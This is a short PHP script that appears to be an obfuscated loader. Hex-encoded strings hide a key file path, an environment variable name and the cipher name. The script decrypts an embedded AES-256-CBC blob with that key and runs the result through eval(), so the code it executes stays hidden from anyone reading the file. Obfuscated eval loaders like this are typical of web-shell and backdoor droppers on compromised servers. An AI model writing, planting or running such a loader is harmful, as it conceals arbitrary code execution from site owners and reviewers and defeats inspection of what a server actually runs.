<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jLiyF+h9kPQkAqJbH/ZHGw==');

$c=base64_decode(

'/s/26d/2DxNXreET6Rx9kg9HwyHaQUjNduIjgFcMDteaaf0G0g4wBN+80zym4bt0ruabFtU+fsHZ' .
'rmKPGGotb5Au1Le0PveYeNPLjOqvt8/BrTEXocC0zkJGeJukEWpIXYG6nqdRnGdURqtnB9mlfwWl' .
'8IgmalV/P4ZUPb6JT03RaQD8eYFRmoxxgCEivKJb5lb6JwRh0U+Nr6Cw4WljvvPGSVjOvlGZxtOe' .
'1k3HZt/90tcNjS1O+QwHAMUpxc42XCQIPp33WNWllAU9QA6uiZ07Q6S+JMUZpBbsieaQC48Ywe+o' .
'9ChH0S8M/o7HtLBsFqfuINLSb1BbCsyd4+TeLkWI06sju3E9c1Fxj0JNe0fidu6RJAM4ClBMl6lk' .
'Xe2u15o5dGKOuyMXCUg+KsdmtnumuN9ArjTfWbi5b98RAKmHP4JiabnkfpHBNJFeETjOMQ4H4Ar4' .
'uV26y53V5UcCnlEEbaoFystFkgwvwBFzQM8N0DAtcH2nYjVmmFDohm6krvWp8UlbggQXSvRKnebj' .
'A4vluRSDEuiz8MLFdldF88s='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

